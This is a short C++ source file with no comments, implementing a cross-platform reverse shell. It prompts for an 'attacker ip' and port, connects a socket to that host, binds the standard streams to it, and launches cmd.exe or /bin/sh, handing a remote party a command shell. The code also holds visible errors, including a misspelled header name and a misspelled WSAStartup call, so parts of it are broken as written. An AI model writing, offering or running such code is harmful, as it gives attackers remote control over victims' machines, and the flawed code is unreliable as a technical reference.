#if defined(_WIN32)
#include <websock2.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif
#include <cstdlib>
#include <iostream>

int main() {
	std::string attacker_ip;
	int attacker_port;
#if defined(_WIN32)
	std::cout << "Enter attacker ip: " << std::endl;
	std::cin >> attacker_ip;
	std::cout << "Enter attacker port: ";
	std::cin >> attacker_port;
	WSADATA wsa;
	WSASturtup(MAKEWORD(2, 2), &wsa);
	SOCKET s = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
	sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(attacker_port);
	sa.sin_addr.s_addr = inet_addr(attacker_ip.c_str());
	connect(s, (sockaddr*)&sa, sizeof(sa));
	_dup2(s, 0); _dup2(s, 1); _dup2(s, 2);
	system("cmd.exe");
	WSACleanup();

#else
	std::cout << "Enter attacker ip: " << std::endl;
	std::cin >> attacker_ip;
	std::cout << "Enter attacker port: ";
	std::cin >> attacker_port;
	int s = socket(AF_INET, SOCK_STREAM, 0);
	sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(attacker_port);
	sa.sin_addr.s_addr = inet_addr(attacker_ip.c_str());
	connect(s, (sockaddr*)&sa, sizeof(sa));
	dup2(s, 0); dup2(s, 1); dup2(s, 2);
	execl("/bin/sh", "sh", NULL);
#endif
	return 0;
}
